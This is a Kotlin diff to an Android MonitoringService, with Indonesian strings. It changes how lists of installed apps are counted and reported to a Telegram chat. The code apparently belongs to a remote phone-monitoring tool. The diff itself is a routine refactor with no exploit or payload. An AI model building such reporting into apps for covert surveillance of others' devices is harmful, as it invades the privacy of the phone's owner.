@@ -3622,13 +3622,14 @@ class MonitoringService : Service() {
             return
         }
         val limit = parsed?.coerceIn(5, 50) ?: 30
-        val apps = if (includeAll) allApps(limit) else listLaunchableApps(limit)
+        val (apps, total) = if (includeAll) allApps(limit) else listLaunchableApps(limit)
         if (apps.isEmpty()) {
             sendToTelegram("\uD83D\uDCE6 Tak ada aplikasi.")
         } else {
+            val countText = if (apps.size < total) "${apps.size} dari $total" else "${apps.size}"
             sendToTelegram(
                 buildString {
-                    appendLine("\uD83D\uDCE6 <b>Aplikasi (${apps.size})</b>" + if (includeAll) " · semua terpasang" else "")
+                    appendLine("\uD83D\uDCE6 <b>Aplikasi ($countText)</b>" + if (includeAll) " · semua terpasang" else "")
                     for (label in apps) {
                         appendLine("\u2022 " + Html.escape(label))
                     }
@@ -3637,24 +3638,24 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun allApps(limit: Int): List<String> {
+    private fun allApps(limit: Int): Pair<List<String>, Int> {
         return try {
             val infos = if (android.os.Build.VERSION.SDK_INT >= 33) {
                 packageManager.getInstalledApplications(android.content.pm.PackageManager.ApplicationInfoFlags.of(0))
             } else {
                 packageManager.getInstalledApplications(0)
             }
-            infos.asSequence()
+            val full = infos.asSequence()
                 .filter { it.packageName != packageName }
                 .map { info ->
                     val label = try { packageManager.getApplicationLabel(info).toString() } catch (_: Exception) { info.packageName }
                     "$label (${info.packageName})" + if (info.enabled) "" else " [nonaktif]"
                 }
                 .sortedBy { it.lowercase(java.util.Locale.ROOT) }
-                .take(limit.coerceIn(1, 200))
                 .toList()
+            Pair(full.take(limit.coerceIn(1, 200)), full.size)
         } catch (_: Exception) {
-            emptyList()
+            Pair(emptyList(), 0)
         }
     }
 
@@ -10180,17 +10181,17 @@ class MonitoringService : Service() {
     @Volatile
     private var appsCache: List<String> = emptyList()
 
-    private fun listLaunchableApps(limit: Int): List<String> {
+    private fun listLaunchableApps(limit: Int): Pair<List<String>, Int> {
         val cached = appsCache
-        if (cached.isNotEmpty() && android.os.SystemClock.elapsedRealtime() - appsCacheAt < 10 * 60_000L) return cached.take(limit)
+        if (cached.isNotEmpty() && android.os.SystemClock.elapsedRealtime() - appsCacheAt < 10 * 60_000L) return Pair(cached.take(limit), cached.size)
         val fresh = listLaunchableAppsFresh()
         if (fresh.isNotEmpty()) {
             appsCache = fresh
             appsCacheAt = android.os.SystemClock.elapsedRealtime()
-            return fresh.take(limit)
+            return Pair(fresh.take(limit), fresh.size)
         }
-        if (cached.isNotEmpty()) return cached.take(limit)
-        return emptyList()
+        if (cached.isNotEmpty()) return Pair(cached.take(limit), cached.size)
+        return Pair(emptyList(), 0)
     }
 
     private fun listLaunchableAppsFresh(): List<String> {
